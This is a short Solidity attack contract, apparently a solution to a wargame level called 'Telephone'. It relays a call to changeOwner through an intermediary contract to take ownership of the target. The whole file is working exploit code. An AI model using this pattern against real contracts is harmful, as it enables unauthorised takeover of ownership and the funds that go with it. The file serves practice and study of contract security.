//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract HackTelephone {
    ITelephone public telephone;

    constructor(address _address){
        telephone = ITelephone(_address);
    }

    function hack (address _address) public {
        telephone.changeOwner(_address);
    }
}